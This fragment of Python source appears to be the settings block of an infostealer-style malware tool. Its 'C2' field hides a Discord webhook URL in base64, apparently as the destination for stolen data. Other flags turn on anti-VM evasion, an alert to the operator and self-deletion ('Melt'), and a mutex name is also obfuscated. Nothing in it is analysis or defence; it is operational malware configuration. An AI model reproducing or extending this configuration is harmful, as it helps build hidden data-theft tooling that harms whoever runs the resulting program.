...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzODQ2ODA5OTc4MzEzNTIzMi9EdVcxQ2p1Wl9MZU84dDJUekl6WnhkZ2NyVlpUT3Z2TmR4UFhJWU5vdDVOZzY4T3Vqd1pScDlBb0VmSV9GdlR0Qm8zVg==').decode())
    Mutex = base64.b64decode('cFJuSzVPcWNsYUhkUHAwcQ==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
